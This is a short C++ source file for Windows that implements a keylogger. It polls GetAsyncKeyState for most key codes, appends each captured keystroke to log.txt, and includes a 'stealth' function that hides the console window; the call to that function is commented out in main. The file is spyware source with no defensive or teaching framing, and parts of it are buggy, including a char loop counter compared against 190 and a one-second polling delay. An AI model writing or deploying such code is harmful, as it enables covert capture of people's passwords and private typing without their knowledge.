/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/* 
 * File:   main.cpp
 * Author: Hüseyin
 *
 * Created on 27 Ağustos 2018 Pazartesi, 23:22
 */

#include <cstdlib>
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winuser.h>
using namespace std;

void save(int keyStroke, char *file);
void hide();
void startKeyStroke();

int main() {
    //hide();
    startKeyStroke();
    return 0;
}

void startKeyStroke() {
    while (1) {
        for (char i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                save(i, "log.txt");
            }
        }
        Sleep(1000);
    }
}

void save(int keyStroke, char *file) {
    FILE* outputFile = fopen(file, "a+");
    if(keyStroke == 1 || keyStroke == 2)
        return;
    
    if (keyStroke == 8){
        fprintf(outputFile, "%s", "[BACKSPACE]");
        cout << "[BACKSPACE]" << endl;
    }
    else if (keyStroke == 13){
        fprintf(outputFile, "%s", "\n");
        cout << endl;
    }
    else if (keyStroke == 32){
        fprintf(outputFile, "%s", " ");
        cout << " " << endl;
    }
    else if (keyStroke == VK_SHIFT){
        fprintf(outputFile, "%s", "[SHIFT]");
        cout << "[SHIFT]" << endl;
    }
    else if (keyStroke == 190 || keyStroke == 110){
        fprintf(outputFile, "%s", ".");
        cout << "[.]" << endl;
    }
    else{
        fprintf(outputFile, "%s", &keyStroke);
        cout << (char*)&keyStroke << endl;
    }
    fclose(outputFile);
}

void hide() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
